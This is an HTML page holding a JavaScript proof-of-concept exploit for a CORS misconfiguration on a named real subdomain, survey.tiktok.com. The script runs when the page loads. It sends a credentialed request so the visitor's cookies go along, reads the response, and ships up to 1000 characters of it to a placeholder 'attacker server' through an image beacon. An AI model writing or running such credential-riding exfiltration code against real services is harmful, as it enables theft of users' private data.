<!DOCTYPE html>
<html>
<head><title>CORS Exploit - survey.tiktok.com</title></head>
<body>
<h1>CORS Misconfiguration Exploit</h1>
<div id="output"></div>
<script>
async function exploit() {
  const output = document.getElementById('output');
  try {
    const response = await fetch("https://survey.tiktok.com", {
      method: "GET",
      credentials: "include",
      mode: "cors"
    });
    const headers = {};
    for(let pair of response.headers.entries()) {
      headers[pair[0]] = pair[1];
    }
    const text = await response.text();
    output.innerHTML = `
      <p>Status: ${response.status}</p>
      <p>Access-Control-Allow-Origin: ${headers['access-control-allow-origin'] || 'NOT PRESENT'}</p>
      <p>Access-Control-Allow-Credentials: ${headers['access-control-allow-credentials'] || 'NOT PRESENT'}</p>
      <p>Response preview (first 500 chars):</p>
      <pre>${escapeHtml(text.substring(0,500))}</pre>
    `;
    // If ACAO is present, send data to attacker server
    if(headers['access-control-allow-origin']) {
      new Image().src = "https://your-attacker-server.com/log?data=" + encodeURIComponent(text.substring(0,1000));
    }
  } catch(err) {
    output.innerHTML = `<p style="color:red">Error: ${err.message}</p>`;
  }
}
function escapeHtml(str) {
  return str.replace(/[&<>]/g, function(m) {
    if(m === '&') return '&amp;';
    if(m === '<') return '&lt;';
    if(m === '>') return '&gt;';
    return m;
  });
}
exploit();
</script>
</body>
</html>
